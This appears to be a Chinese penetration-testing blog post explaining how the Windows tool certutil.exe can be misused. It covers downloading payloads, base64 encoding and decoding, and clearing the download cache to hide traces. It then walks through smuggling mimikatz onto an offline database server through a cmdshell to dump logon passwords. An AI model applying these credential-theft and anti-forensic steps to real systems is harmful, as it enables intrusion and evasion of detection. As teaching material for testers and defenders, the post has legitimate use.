# 前言
写这篇的起因是围观了一点对话：
> 问：在工作组环境下，db服务器不出网（站库分离），有cmdshell。如果只是单单针对这个入口，有什么思路进行深入？<br><br>答：在echo正常的情况下，可以将工具打成base64丢上去抓明文密码，或者hash。

**将工具做成base64丢上目标纯内网db服务器** 这是什么操作？

我去问了我朋友，他就跟我说了一个 `certutil`，剩下的就靠自己操作了。

-----------
# Certutil 是什么？
`certutil.exe` 是一个合法Windows文件，用于管理Windows证书的程序。

微软官方是这样对它解释的：
> Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。

但是此合法Windows服务现已被广泛滥用于恶意用途。

渗透中主要利用其 `下载`、`编码`、`解码`、`替代数据流` 等功能。
![title](https://leanote.com/api/file/getImage?fileId=5da17e8eab64411aeb00099a)

-----
# 基于渗透的 Certutil 语法
大佬们的博客里面都是参数拿起来就用，我不懂，所以在 [Certutil 的 Windows 官方文档](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)去找了下跟渗透有关、可以被利用的相关语法、参数。

![title](https://leanote.com/api/file/getImage?fileId=5da1961cab64411aeb000a76)
## 参数：
- `-f`
覆盖现有文件。
有值的命令行选项。后面跟要下载的文件 url。

- `-split`
保存到文件。
无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。

- `-URLCache`	
显示或删除URL缓存条目。
无值的命令行选项。
（certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）

- `-encode`	
将文件编码为Base64

- `-decode`	
解码Base64编码的文件

----------

# 渗透测试中的应用
## 下载功能
**(1) 保存在当前路径，文件名称同URI**

语法：
``` shell
certutil.exe -urlcache -split -f 文件url
```

payload:

![title](https://leanote.com/api/file/getImage?fileId=5da1873dab64411aeb0009ca)

效果：

如图，没有问题：
![title](https://leanote.com/api/file/getImage?fileId=5da186a9ab64411aeb0009c3)


**(2) 保存在当前路径，指定保存文件名称**

语法：
``` shell
certutil.exe -urlcache -split -f 文件url file.txt
```

payload：

![title](https://leanote.com/api/file/getImage?fileId=5da187b6ab64411aeb0009ce)

效果：
![title](https://leanote.com/api/file/getImage?fileId=5da187e6ab64411aeb0009d6)

**(3) 保存在缓存目录，名称随机**

缓存目录位置： %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content

语法：

``` shell
certutil.exe -urlcache -f 文件url
```

payload:

![title](https://leanote.com/api/file/getImage?fileId=5da18a3eab64411aeb0009e9)

效果：

![title](https://leanote.com/api/file/getImage?fileId=5da18a95ab64411ce40009c2)

文件名变了。

此种情况无法指定文件名：

如下图，成功写入了。但是文件名还是改变了（根据写入时间确定的文件）。
![title](https://leanote.com/api/file/getImage?fileId=5da18bc7ab64411aeb000a15)

其实这条命令同时也在当前目录写入了一个文件：
![title](https://leanote.com/api/file/getImage?fileId=5da1982bab64411aeb000a9c)

**(4) 支持保存二进制文件**

语法：

``` shell
certutil.exe -urlcache -split -f 二进制文件url
```

payload：

![title](https://leanote.com/api/file/getImage?fileId=5da18dd8ab64411aeb000a21)

效果:

![title](https://leanote.com/api/file/getImage?fileId=5da18e2eab64411ce40009ec)


**清除痕迹**：
certutil.exe 下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹。

查看所有缓存记录:
``` shell
certutil.exe -urlcache *
```

![title](https://leanote.com/api/file/getImage?fileId=5da18fe3ab64411ce40009f6)

我就试下能不能全删了缓存记录就成功了：
``` shell
certutil.exe -urlcache * delete
```

![title](https://leanote.com/api/file/getImage?fileId=5da1908fab64411aeb000a4a)

也不知道缓存项目都删了，会有什么后果呢。(´-ω-`)

标准做法是：

每次下载后，需要马上执行如下：
``` shell
certutil.exe -urlcache -split -f 文件url delete
```

也就是下载语句加一个`delete`关键字。
![title](https://leanote.com/api/file/getImage?fileId=5da1912bab64411aeb000a50)

![title](https://leanote.com/api/file/getImage?fileId=5da193faab64411aeb000a6a)
![title](https://leanote.com/api/file/getImage?fileId=5da1946cab64411ce4000a19)
l
或者也可以直接删除缓存目录对应文件。
默认在缓存目录位置： %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content保存下载的文件副本。
直接删除：

![title](https://leanote.com/api/file/getImage?fileId=5da194faab64411aeb000a71)

## base64编码转换
(1) base64编码：

``` shell
certutil.exe -encode InFile OutFile
```
![title](https://leanote.com/api/file/getImage?fileId=5da19981ab64411ce4000a69)
![title](https://leanote.com/api/file/getImage?fileId=5da1999eab64411ce4000a6b)

(2) base64解码
``` shell
CertUtil -decode InFile OutFile
```

![title](https://leanote.com/api/file/getImage?fileId=5da19a51ab64411aeb000cac)
![title](https://leanote.com/api/file/getImage?fileId=5da19a57ab64411ce4000caa)

**注：编码后的文件会添加两处标识信息：**

文件头：
-----BEGIN CERTIFICATE-----

文件尾：
-----END CERTIFICATE-----


-------------

# 回归问题

## 初次尝试

基本了解了Certuil，下面回归最开始的问题：

> 问：在工作组环境下，db服务器不出网（站库分离），有cmdshell。如果只是单单针对这个入口，有什么思路进行深入？<br><br>答：在echo正常的情况下，可以将工具打成base64丢上去抓明文密码，或者hash。


**1.mimikatz exe → certutil encode → base64encode.txt**
![title](https://leanote.com/api/file/getImage?fileId=5da1a31dab64411aeb000d64)

**2.echo string..line > base64decode.txt**

注意要把`mimikatz.txt`从这样：

![title](https://leanote.com/api/file/getImage?fileId=5da1a94fab64411ce4000d18)

变成这样：

![title](https://leanote.com/api/file/getImage?fileId=5da1a9c7ab64411aeb000d8e)

就是去掉所有的空行（`-----BEGIN CERTIFICATE-----`和`-----END CERTIFICATE-----`这两句可以删掉）。

`注：`已经做过实验，这样没问题。decode 出来是一样的。
附脚本：
``` python
with open('mmm.txt') as f:
    with open('test.txt','w') as n:
        for i in f.readlines():
            i = str(i.split()).strip("['").strip("']")
            n.write(i)
```

echo 入目标机器保存为文件：

![title](https://leanote.com/api/file/getImage?fileId=5da1ac77ab64411ce4000d20)

![](https://leanote.com/api/file/getImage?fileId=5da1ac7bab64411ce4000d21)


**3.certutil.exe decode base64decode.txt -> mimikatz.exe**
![title](https://leanote.com/api/file/getImage?fileId=5da1ad40ab64411aeb000d97)

![title](https://leanote.com/api/file/getImage?fileId=5da1ad73ab64411ce4000d22)


**4.cmd.exe /c mimikatz.exe "sekurlsa::logonpasswords"**
本以为到此大功告成，没想到：
![title](https://leanote.com/api/file/getImage?fileId=5da1b4aeab64411ce4000d3f)

## 从发现问题到自闭
该`exe`文件无法运行，我以为是电脑位数的问题，但是我试了下32位的mimikatz也是一样的问题。

在本机 windows 10 尝试此操作成功。另外对比了下传到目标机器的两个exe文件，都比原mimikatz exe小（原64位990 KB）。为什么这两个文件一个32位一个64位传上来文件就一样大了？

![title](https://leanote.com/api/file/getImage?fileId=5da1b56dab64411aeb000db0)

另外在目标上我直接下载了 mimikatz 发现可以运行，那一定不是mimikatz版本的问题。

至此答案已经昭然若揭了：就是命令行字符限制的问题。

![title](https://leanote.com/api/file/getImage?fileId=5da1b622ab64411aeb000db1)

所以解决方案也很简单：把编码后的文件分段追加到目标机器上。

但是这其实也不可行，因为切出来的子文件太多了（base64之后mimikatz 1.32MB）：
![title](https://leanote.com/api/file/getImage?fileId=5da1bf9bab64411aeb000dca)

一个一个echo追加我会先累死的。

直到这个时候、才会明白，工具的轻量级是多么重要。这种情况遇到可以写脚本的地方写个脚本自动追加上去。

这个时候应该怎么处理？
把mimikatz的抓明文功能单独提出来，这个部分请教了前辈。也按照约定不能写出来了。只能说，处理完的exe只有10多KB。

这样文件太大的限制不复存在。不做演示了。



-------------

# 多说一点：

我们在渗透中主要使用 Certuil 的下载（及编解码）功能，其（部分）替代品还有很多，如:

![title](https://leanote.com/api/file/getImage?fileId=5da17e7aab64411ce4000961)

![title](https://leanote.com/api/file/getImage?fileId=5da17e9aab64411ce4000962)

出处：[Cooolis](https://cooolis.payloads.online/)， [LOLBAS](https://lolbas-project.github.io/)，[GTFOBins](https://gtfobins.github.io/) 


cmd下常用的下载文件（downloader）方法如下：

 - certUtil 
 - powershell 
 - csc 
 - vbs 
 - JScript 
 - hta 
 - bitsadmin 
 - wget 
 - debug
 - ftp
 - ftfp

出处：3gstudent —— 《渗透技巧——通过cmd上传文件的N种方法》

# 总结：
## 别忘删缓存项目：
- 查看利用certUtil下载文件的缓存记录：
``` bash
certutil.exe -urlcache *
```

- 缓存文件位置：
%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content

- 删除缓存记录
下载命令后面加 `delete` 关键词。

## 遇到cmd长度限制

要么减小工具体积，要么脚本追加。



--------------

### 参考链接：
[1] [第三十八课：certutil一句话下载payload](https://micro8.gitbook.io/micro8/contents-1/31-40/38certutil-yi-ju-hua-xia-zai-payload)，Micro8
[2] [渗透测试中的certutil](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/)，3gstudent，2017年7月26日
[3] [certutil微软文档](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)，Microsoft，2017年10月16日
[4] [CMD SHELL ECHO 写文件](http://rinige.com/index.php/archives/794/)，2017年9月18日